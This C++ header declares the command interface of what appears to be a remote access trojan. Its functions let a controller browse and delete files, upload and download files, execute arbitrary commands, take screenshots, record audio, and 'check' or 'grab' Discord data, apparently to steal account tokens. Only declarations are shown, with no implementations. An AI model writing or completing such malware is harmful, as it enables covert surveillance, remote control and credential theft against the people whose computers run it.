#ifndef COMMANDS_H
#define COMMANDS_H

#include "simplecommand.h"
#include "controller.h"
#include <vector>

enum class NavigateCommand {
    ls, cd, pwd, rm
};

enum class AudioCommand {
    start, stop, list
};

enum class DiscordCommand {
    check, grab
};

// navigation
int navigation(Controller& ctrl, unsigned char cmd, std::vector<char> data);
int listFiles(Controller& ctrl, const std::string path);
int changeDir(Controller& ctrl, const std::string path);
int pwd(Controller& ctrl);
int removeFile(Controller& ctrl, const std::string path);

// files
int downloadFile(Controller& ctrl, const std::string path);
int uploadFile(Controller& ctrl, const std::string path, std::vector<char> data);

// exec
int exec(Controller& ctrl, const std::string cmd, bool wait);

// screen
int screenshot(Controller& ctrl);

// audio
int audioCommand(Controller& ctrl, AudioCommand cmd);

// discord
int discordCommand(Controller& ctrl, DiscordCommand cmd);

#endif